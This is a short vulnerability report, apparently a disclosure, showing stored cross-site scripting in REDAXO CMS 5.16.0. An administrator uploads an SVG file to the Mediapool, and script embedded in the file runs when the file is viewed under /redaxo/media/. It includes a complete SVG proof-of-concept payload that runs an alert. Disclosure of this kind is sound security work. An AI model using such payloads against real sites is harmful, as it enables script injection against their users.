###  In REDAXOcms version 5.16.0  i found stored xss through uploading svg file 

REDAXOcms version 5.16.0

Demo installation: http://localhost/redaxo/redaxo/index.php?page=mediapool/upload

### Reproduce bug:

Step 1: Access to http://localhost/redaxo/redaxo and login with adminstrator account. Go to Mediapool feature and upload svg file with xss payload
```
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
   <script type="text/javascript">
      alert('xss');
   </script>
</svg>

```

![Alt text](11.png)

![Alt text](21.png)

Step 2: After upload success, i try to access my svg file in /redaxo/media/{filename} and xss payload trigger.

![Alt text](31.PNG)

